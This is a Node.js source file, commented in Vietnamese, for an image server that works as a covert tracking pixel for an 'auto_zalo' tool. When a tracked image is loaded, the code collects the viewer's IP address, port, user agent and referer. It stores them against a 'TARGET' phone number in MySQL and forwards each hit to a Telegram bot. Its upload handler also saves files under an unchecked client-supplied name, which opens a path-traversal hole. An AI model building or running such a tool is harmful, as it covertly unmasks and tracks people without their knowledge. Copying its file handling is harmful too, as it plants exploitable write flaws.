// ════════════════════════════════════════════════════════════════
// IMAGE SERVER - LOG TRACKING VỚI MYSQL auto_zalo
// ════════════════════════════════════════════════════════════════

const express = require("express");
const mysql = require("mysql2/promise");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

// Load cấu hình duy nhất từ file .env tại thư mục gốc /WEB
const envPath = path.resolve(__dirname, "../.env");
const envResult = require("dotenv").config({ path: envPath, override: true });
if (envResult.error) {
  console.error(`⚠️ [FILES_SERVER] Không thể load file .env tại: ${envPath}`);
}

const app = express();

// Middleware để đọc body JSON và urlencoded (cho remote-server)
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const multer = require("multer");

const PORT = process.env.FILES_SERVER_PORT;
const IMAGE_FILE = process.env.FILES_SERVER_IMAGE_FILE;
const DOCKER_HOST = process.env.DOCKER_HOST.trim().toLowerCase() == "true";

// Cấu hình Telegram
const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_ID;

let DB_HOST;
let HOST;

if (DOCKER_HOST) {
  DB_HOST = `host.docker.internal`;
  HOST = `0.0.0.0`;
} else {
  DB_HOST = `127.0.0.1`;
  HOST = `127.0.0.1`;
}

// Cấu hình lưu trữ cho ảnh tùy chọn
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dest = path.join(__dirname, "files");
    if (!fs.existsSync(dest)) {
      fs.mkdirSync(dest, { recursive: true });
    }
    cb(null, dest);
  },
  filename: (req, file, cb) => {
    const uid = req.headers["x-user-id"];
    if (uid) {
      cb(null, `cus_user_${uid}.png`);
    } else {
      cb(null, `cus_user_unknown_${Date.now()}.png`); // Fallback
    }
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 3 * 1024 * 1024 }, // 3MB limit
  fileFilter: (req, file, cb) => {
    // Kiểm tra cơ bản
    if (
      file.mimetype === "image/png" ||
      path.extname(file.originalname).toLowerCase() === ".png"
    ) {
      cb(null, true);
    } else {
      cb(new Error("Chỉ chấp nhận file PNG"), false);
    }
  },
});

// Cấu hình lưu trữ cho ảnh Thumbnail trang mẫu (img_links)
const thumbStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dest = path.join(__dirname, "files", "img_links");
    if (!fs.existsSync(dest)) {
      fs.mkdirSync(dest, { recursive: true });
    }
    cb(null, dest);
  },
  filename: (req, file, cb) => {
    if (req.body && req.body.custom_filename) {
      cb(null, req.body.custom_filename);
    } else {
      const ext = path.extname(file.originalname) || ".png";
      cb(null, `thumb_${Date.now()}${ext}`);
    }
  },
});

const uploadThumbnail = multer({
  storage: thumbStorage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    if (
      file.mimetype.startsWith("image/") ||
      /\.(jpg|jpeg|png|webp|gif|bmp|svg)$/i.test(file.originalname)
    ) {
      cb(null, true);
    } else {
      cb(new Error("Chỉ chấp nhận file ảnh (PNG, JPG, WEBP, GIF,...)"), false);
    }
  },
});

// ════════════════════════════════════════════════════════════════
// MYSQL CONNECTION POOL
// ════════════════════════════════════════════════════════════════

const pool = mysql.createPool({
  host: DB_HOST,
  port: process.env.DB_PORT,
  user: process.env.DB_USER_FILE,
  password: process.env.DB_PASSWORD_FILE,
  database: process.env.DB_NAME,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
});

// ════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS
// ════════════════════════════════════════════════════════════════

// Định dạng thời gian GMT+7 -> HH:mm:ss dd/mm/yyyy
function nowGmt7() {
  const now = new Date();
  const utc = now.getTime() + now.getTimezoneOffset() * 60000;
  const d = new Date(utc + 7 * 60 * 60 * 1000);
  const p = (n) => String(n).padStart(2, "0");
  return `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())} ${p(d.getDate())}/${p(d.getMonth() + 1)}/${d.getFullYear()}`;
}

// Gửi thông báo qua Telegram
async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("⚠️ Telegram Bot Token hoặc Chat ID chưa được cấu hình.");
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML",
    });
    console.log("🚀 Đã gửi thông báo Telegram thành công!");
  } catch (error) {
    console.error(
      "❌ Lỗi gửi Telegram:",
      error.response?.data || error.message,
    );
  }
}

// ════════════════════════════════════════════════════════════════
// TRACKING & DATABASE LOGIC (SỬ DỤNG CHUNG)
// ════════════════════════════════════════════════════════════════
async function handleTracking({
  reqId,
  ipForwarded,
  socketPort,
  timestamp,
  ua,
  targetImageFile,
  referer,
  requestPath,
  linkIdQuery,
}) {
  const fullSourceStr = `${ipForwarded}:${socketPort}`;

  // 1. Log vào file
  try {
    fs.appendFileSync(
      "image-server-logs.txt",
      `${timestamp} - reqID: ${reqId || "N/A"} - IP/Port: ${fullSourceStr} - UA: ${ua} - Referer: ${referer} - File: ${targetImageFile}\n`,
    );
  } catch (err) {
    console.error("⚠️ Lỗi ghi log file:", err.message);
  }

  // 1b. Kiểm tra nếu yêu cầu có tham số query ?id={link_id} (chức năng links)
  if (linkIdQuery) {
    const thumbnailLinkId = linkIdQuery;
    try {
      const resultFormatted = `IP: ${ipForwarded || 'N/A'}\nPort: ${socketPort || 'N/A'}\nUser-Agent: ${ua || 'N/A'}\nReferer: ${referer || 'N/A'}\nThời gian: ${timestamp}`;

      const [existing] = await pool.query(
        'SELECT id, results FROM link_results_thumbnail WHERE link_id = ? LIMIT 1',
        [thumbnailLinkId]
      );

      if (existing.length > 0) {
        const currentResults = existing[0].results || '';
        const newResults = currentResults.trim()
          ? `${currentResults}\n-----------------------\n${resultFormatted}`
          : resultFormatted;
        await pool.query(
          'UPDATE link_results_thumbnail SET results = ? WHERE id = ?',
          [newResults, existing[0].id]
        );
        console.log(`✅ [FILES_SERVER] Đã cập nhật link_results_thumbnail cho link_id=${thumbnailLinkId}`);
      } else {
        await pool.query(
          'INSERT INTO link_results_thumbnail (link_id, results) VALUES (?, ?)',
          [thumbnailLinkId, resultFormatted]
        );
        console.log(`✅ [FILES_SERVER] Đã thêm mới link_results_thumbnail cho link_id=${thumbnailLinkId}`);
      }

      // Gửi thông báo Telegram cho kết quả Link Tool (Thumbnail)
      const linkTeleMsg =
        `<b>[LINK TOOL - THUMBNAIL HIT]</b>\n` +
        `<b>LINK ID:</b> ${thumbnailLinkId}\n` +
        `🌐 <b>Địa chỉ IP:</b> ${ipForwarded || "N/A"}\n` +
        `🌐 <b>Địa chỉ Port:</b> ${socketPort || "N/A"}\n` +
        `⏰ <b>Thời gian:</b> ${timestamp}\n` +
        `🖥️ <b>Thiết bị:</b> ${ua || "N/A"}`;
      sendTelegram(linkTeleMsg).catch((err) =>
        console.error("❌ Lỗi gửi Telegram cho Link Tool Thumbnail:", err.message),
      );
    } catch (tErr) {
      console.error('❌ [FILES_SERVER] Lỗi ghi link_results_thumbnail:', tErr.message);
    }
    return;
  }

  let teleMsg = null;

  // 2. Cập nhật database cho auto_zalo / oa_result
  if (reqId) {
    try {
      if (reqId.startsWith("BC")) {
        const [rows] = await pool.query(
          "SELECT detail, phone_number FROM oa_result WHERE order_code = ?",
          [reqId],
        );
        if (rows.length > 0) {
          const currentDetail = rows[0].detail || "";
          const NEW_LINE = "<br>";
          const newBlock =
            `🌐 Địa chỉ IP: ${ipForwarded}${NEW_LINE}` +
            `🌐 Địa chỉ Port: ${socketPort}${NEW_LINE}` +
            `⏰ Thời gian: ${timestamp}${NEW_LINE}` +
            `🖥️ Thiết bị người dùng: ${ua}${NEW_LINE}`;
          const separator = currentDetail.trim() ? `${NEW_LINE}<hr>` : "";
          const newDetail = currentDetail + separator + newBlock;

          await pool.query(
            "UPDATE oa_result SET detail = ? WHERE order_code = ?",
            [newDetail, reqId],
          );
          console.log(`✅ Đã cập nhật detail cho order_code=${reqId}`);

          const phoneNumber = rows[0].phone_number || "N/A";
          const teleBlock =
            `🌐 <b>Địa chỉ IP:</b> ${ipForwarded}\n` +
            `🌐 <b>Địa chỉ Port:</b> ${socketPort}\n` +
            `⏰ <b>Thời gian:</b> ${timestamp}\n` +
            `🖥️ <b>Thiết bị:</b> ${ua}`;
          teleMsg = `<b>[ZALO OA RESULT]</b>\n<b>PHONE: ${phoneNumber}</b>\n<b>ORDER_CODE: ${reqId}</b>\n${teleBlock}`;
        } else {
          console.warn(
            `⚠️ [Tracking] Không tìm thấy order_code=${reqId} trong database.`,
          );
        }
      } else if (/^\d+$/.test(reqId)) {
        const reqIdInt = parseInt(reqId, 10);
        const [rows] = await pool.query(
          "SELECT Detail, phoneNumber, displayName FROM auto_request WHERE reqID = ?",
          [reqIdInt],
        );
        if (rows.length > 0) {
          const currentDetail = rows[0].Detail || "";
          const NEW_LINE = "<br>";
          const newBlock =
            `🌐 Địa chỉ IP: ${ipForwarded}${NEW_LINE}` +
            `🌐 Địa chỉ Port: ${socketPort}${NEW_LINE}` +
            `⏰ Thời gian: ${timestamp}${NEW_LINE}` +
            `🖥️ Thiết bị người dùng: ${ua}${NEW_LINE}`;
          const separator = currentDetail.trim() ? `${NEW_LINE}<hr>` : "";
          const newDetail = currentDetail + separator + newBlock;

          await pool.query(
            "UPDATE auto_request SET Detail = ? WHERE reqID = ?",
            [newDetail, reqIdInt],
          );
          console.log(`✅ Đã cập nhật Detail cho reqID=${reqIdInt}`);

          const phoneNumber = rows[0].phoneNumber || rows[0].displayName || "N/A";
          const teleBlock =
            `🌐 <b>Địa chỉ IP:</b> ${ipForwarded}\n` +
            `🌐 <b>Địa chỉ Port:</b> ${socketPort}\n` +
            `⏰ <b>Thời gian:</b> ${timestamp}\n` +
            `🖥️ <b>Thiết bị:</b> ${ua}`;
          teleMsg = `<b>[ZALO TOOL RESULT]</b>\n<b>TARGET: ${phoneNumber}</b>\n<b>REQ_ID: ${reqIdInt}</b>\n${teleBlock}`;
        } else {
          console.warn(
            `⚠️ [Tracking] Không tìm thấy reqID=${reqIdInt} trong database.`,
          );
        }
      } else {
        console.warn(
          `⚠️ [Tracking] reqId "${reqId}" không đúng định dạng (BC* hoặc số).`,
        );
      }
    } catch (dbErr) {
      console.error("❌ Lỗi database:", dbErr.message);
    }
  } else {
    console.log("ℹ️ [Tracking] Không có reqId, bỏ qua cập nhật database.");
  }

  // 3. Gửi Telegram
  if (teleMsg) {
    sendTelegram(teleMsg).catch((err) =>
      console.error("❌ Lỗi gửi Telegram:", err.message),
    );
  }
}

// ════════════════════════════════════════════════════════════════
// HELPER SERVE FILE
// ════════════════════════════════════════════════════════════════
function serveImageFile(targetImageFile, res) {
  const cleanRelPath = (targetImageFile || '').replace(/^\/+/, '');
  let imagePath = path.join(__dirname, "files", cleanRelPath);

  if (!fs.existsSync(imagePath)) {
    imagePath = path.join(__dirname, "files", path.basename(cleanRelPath));
  }

  fs.access(imagePath, fs.constants.F_OK, (err) => {
    if (err) {
      console.error("❌ File không tồn tại:", imagePath);
      return res.status(404).send("❌ File không tồn tại");
    }

    const ext = path.extname(imagePath).toLowerCase();
    const mimeTypes = {
      ".jpg": "image/jpeg",
      ".jpeg": "image/jpeg",
      ".png": "image/png",
      ".gif": "image/gif",
      ".webp": "image/webp",
      ".bmp": "image/bmp",
      ".svg": "image/svg+xml",
    };
    const contentType = mimeTypes[ext] || "application/octet-stream";

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Type", contentType);
    res.setHeader(
      "Cache-Control",
      "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0",
    );
    res.setHeader("Pragma", "no-cache");
    res.setHeader("Expires", "0");

    fs.createReadStream(imagePath).pipe(res);
  });
}

// ════════════════════════════════════════════════════════════════
// MAIN ROUTE
// ════════════════════════════════════════════════════════════════

// ════════════════════════════════════════════════════════════════
// MAIN ROUTE - SỬ DỤNG WILDCARD (*) ĐỂ BẮT TÊN FILE TỪ PATHNAME
// ════════════════════════════════════════════════════════════════

// ------------------------------------------------------------
// API UPLOAD FILE
// ------------------------------------------------------------
app.post("/api/upload", upload.single("custom_image"), (req, res) => {
  try {
    if (!req.file) {
      return res
        .status(400)
        .json({ success: false, message: "Không nhận được file ảnh từ proxy" });
    }
    console.log(`✅ Đã nhận và lưu file mới: ${req.file.filename}`);
    res.status(200).json({
      success: true,
      message: "Upload thành công",
      filename: req.file.filename,
    });
  } catch (error) {
    console.error("Lỗi lưu file:", error.message);
    res
      .status(500)
      .json({ success: false, message: "Lỗi internal file server" });
  }
});

// ------------------------------------------------------------
// API UPLOAD THUMBNAIL CHO LINK_SERVER
// ------------------------------------------------------------
app.post("/api/upload-thumbnail", uploadThumbnail.single("thumbnail"), (req, res) => {
  try {
    if (!req.file) {
      return res
        .status(400)
        .json({ success: false, message: "Không nhận được file ảnh thumbnail" });
    }
    console.log(`✅ [FILES_SERVER] Đã nhận và lưu file thumbnail: ${req.file.filename}`);
    res.status(200).json({
      success: true,
      message: "Upload thumbnail thành công",
      filename: req.file.filename,
      rel_path: `img_links/${req.file.filename}`,
    });
  } catch (error) {
    console.error("❌ [FILES_SERVER] Lỗi lưu file thumbnail:", error.message);
    res
      .status(500)
      .json({ success: false, message: "Lỗi internal file server khi upload thumbnail" });
  }
});

// Bắt lỗi Multer trên FILE_SERVER
app.use("/api/upload", (err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    return res
      .status(400)
      .json({ success: false, message: `Multer Error: ${err.message}` });
  } else if (err) {
    return res
      .status(400)
      .json({ success: false, message: `Upload Error: ${err.message}` });
  }
  next();
});

// ------------------------------------------------------------
// API SERVE FILE
// ------------------------------------------------------------

// ------------------------------------------------------------
// API REMOTE SERVER (Nhận dữ liệu từ server khác và trả về file)
// ------------------------------------------------------------
app.post("/remote-server", async (req, res) => {
  const { reqId, targetImageFile, ipForwarded, socketPort, timestamp, ua, referer, requestPath, query } =
    req.body;

  if (!targetImageFile) {
    return res.status(400).send("❌ Thiếu targetImageFile");
  }

  const reqPath = requestPath || targetImageFile;
  const linkIdQuery = (query && query.id) || req.query?.id;

  console.log(`📩 Nhận request remote reqID=${reqId}, path=${reqPath}`);

  // Xử lý tracking (Database + Telegram + Log)
  await handleTracking({
    reqId,
    ipForwarded,
    socketPort,
    timestamp,
    ua,
    targetImageFile: reqPath,
    referer: referer || "Remote Server",
    requestPath: reqPath,
    linkIdQuery,
  });

  // Trả về file
  serveImageFile(reqPath, res);
});

app.get("/*", async (req, res) => {
  const requestPath = req.path;
  const targetImageFile = requestPath.replace(/^\/+/, '');

  if (
    !targetImageFile ||
    targetImageFile === "/" ||
    path.extname(targetImageFile) === ""
  ) {
    console.log("❌ Request không chứa tên file hợp lệ. Không trả về file.");
    return res
      .status(404)
      .send("❌ Vui lòng chỉ định tên file trong URL path (ví dụ: /file.png)");
  }

  const ua = req.headers["user-agent"] || "Không có";
  const socketPort = req.socket?.remotePort || "N/A";
  const referer = req.headers["referer"] || "Không có";

  const cfIpv6 = req.headers["cf-connecting-ipv6"];
  const cfIp = req.headers["cf-connecting-ip"];
  const trueClientIp = req.headers["true-client-ip"];
  let xForwardedFor = req.headers["x-forwarded-for"];

  if (xForwardedFor && typeof xForwardedFor === "string") {
    xForwardedFor = xForwardedFor.split(",")[0].trim();
  }

  const socketIP = req.socket?.remoteAddress;

  let ipForwarded =
    cfIpv6 || cfIp || trueClientIp || xForwardedFor || socketIP || "Không có";

  if (ipForwarded.startsWith("::ffff:") && ipForwarded.includes(".")) {
    ipForwarded = ipForwarded.replace("::ffff:", "");
  }

  const timestamp = nowGmt7();
  const reqId = req.query.req;
  const linkIdQuery = req.query.id;

  // Gọi hàm xử lý chung (Log, DB, Telegram)
  await handleTracking({
    reqId,
    ipForwarded,
    socketPort,
    timestamp,
    ua,
    targetImageFile,
    referer,
    requestPath,
    linkIdQuery,
  });

  // Trả về file ảnh
  serveImageFile(targetImageFile, res);
});

// ════════════════════════════════════════════════════════════════
// START SERVER
// ════════════════════════════════════════════════════════════════

async function startServer() {
  try {
    // Test database connection
    const connection = await pool.getConnection();
    console.log("✅ Kết nối database auto_zalo thành công!");
    console.log(`   Database: ${process.env.DB_NAME || "auto_zalo"}`);
    connection.release();

    // Kiểm tra file ảnh
    const imagePath = path.join(__dirname, "files", IMAGE_FILE);
    if (!fs.existsSync(imagePath)) {
      console.warn("⚠️ Cảnh báo: File ảnh không tồn tại:", imagePath);
      console.warn('   Vui lòng tạo thư mục "files" và đặt file ảnh vào đó');
    } else {
      console.log("✅ File ảnh tồn tại:", imagePath);
    }

    // Start server
    app.listen(PORT, HOST, () => {
      console.log(
        "\n╔════════════════════════════════════════════════════════════════╗",
      );
      console.log(
        "║          FILES_SERVER đang chạy tại http://" + HOST + ":" + PORT + "         ║",
      );
      console.log(
        "╠════════════════════════════════════════════════════════════════╣",
      );
      console.log("║ ⚙️  CẤU HÌNH ĐÃ LOAD TỪ /WEB/.ENV:                              ║");
      console.log("║   • ENV PATH             : " + envPath);
      console.log("║   • FILES_SERVER_PORT    : " + PORT);
      console.log("║   • FILES_SERVER_DOMAIN  : " + (process.env.FILES_SERVER_DOMAIN || 'N/A'));
      console.log("║   • IMAGE_FILE           : " + IMAGE_FILE);
      console.log("║   • DB_HOST / DB_PORT    : " + DB_HOST + ":" + (process.env.DB_PORT || 'N/A'));
      console.log("║   • DB_NAME / DB_USER    : " + (process.env.DB_NAME || 'N/A') + " (" + (process.env.DB_USER_FILE || 'N/A') + ")");
      console.log(
        "╚════════════════════════════════════════════════════════════════╝\n",
      );
    });
  } catch (error) {
    console.error("\n❌ Lỗi khởi động server:", error.message);
    process.exit(1);
  }
}

// Graceful shutdown
process.on("SIGINT", async () => {
  console.log("\n\n⏹️  Đang tắt server...");
  await pool.end();
  process.exit(0);
});

process.on("SIGTERM", async () => {
  console.log("\n\n⏹️  Đang tắt server...");
  await pool.end();
  process.exit(0);
});

// Start
startServer();

